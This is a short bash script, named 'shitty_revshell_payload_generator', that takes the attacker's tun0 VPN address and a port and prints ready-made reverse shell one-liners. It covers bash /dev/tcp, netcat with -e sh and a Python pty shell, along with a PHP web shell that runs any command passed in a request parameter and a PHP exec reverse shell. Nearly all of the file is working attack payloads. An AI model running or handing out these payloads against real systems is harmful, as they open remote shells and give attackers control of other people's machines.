#!/bin/bash

RED="\e[31m"
BLUE="\e[34m"
YELLOW="\e[33m"
ENDCOLOR="\e[0m"

if [[ "$#" -eq 0 ]]; then
    echo -e "\n${RED}[x]${ENDCOLOR} Option not provided"
    echo -e "\nUsage: shitty_revshell_payload_generator [OPTION]"
fi

IP=$(ip a | grep "tun0" | xargs | cut -d ' ' -f 15 | cut -d '/' -f 1)

if [[ "$1" == "bash" ]]; then
    if [[ "$#" -ne 2 ]]; then
        echo -e "\n${RED}[x]${ENDCOLOR} IP address or port not provided"
        echo -e "\nUsage: revshell bash <port>"
    else
        echo -e "\n${BLUE}[+]${ENDCOLOR} Bash reverse shell payloads generated:\n"
        echo -e "\t${YELLOW}-${ENDCOLOR} bash -i >& /dev/tcp/$IP/$2 0>&1"
        echo -e "\t${YELLOW}-${ENDCOLOR} bash -c 'bash -i >& /dev/tcp/$IP/$2 0>&1'"
    fi

elif [[ "$1" == "php" ]]; then
    if [[ "$#" -ne 2 ]]; then
        echo -e "\n${RED}[x]${ENDCOLOR} IP address or port not provided"
        echo -e "\nUsage: revshell php <port>"
    else
        echo -e "\n${BLUE}[+]${ENDCOLOR} Php shell payloads generated:\n"
        echo -e "\t${YELLOW}-${ENDCOLOR} <?php if(isset(\$_REQUEST[\"cmd\"])){ echo \"<pre>\"; \$cmd = (\$_REQUEST[\"cmd\"]); system(\$cmd); echo \"</pre>\"; die; }?>"
        echo -e "\t${YELLOW}-${ENDCOLOR} <?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$IP/$2 0>&1'\");"
    fi

elif [[ "$1" == "nc" ]]; then
    if [[ "$#" -ne 2 ]]; then
        echo -e "\n${RED}[x]${ENDCOLOR} IP address or port not provided"
        echo -e "\nUsage: revshell nc <port>"
    else
        echo -e "\n${BLUE}[+]${ENDCOLOR} Netcat reverse shell payloads generated:\n"
        echo -e "\t${YELLOW}-${ENDCOLOR} nc $IP $2 -e sh"
    fi

elif [[ "$1" == "python" ]]; then
    if [[ "$#" -ne 2 ]]; then
        echo -e "\n${RED}[x]${ENDCOLOR} IP address or port not provided"
        echo -e "\nUsage: revshell python <port>"
    else
        echo -e "\n${BLUE}[+]${ENDCOLOR} Python reverse shell payloads generated:\n"
        echo -e "\t${YELLOW}-${ENDCOLOR} python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
    fi

else
    echo -e "\n${RED}[x]${ENDCOLOR} Invalid option"
    echo -e "\nUsage: shitty_revshell_payload_generator [OPTION]"
    echo -e "\tValid options: bash, php, nc, python"
fi
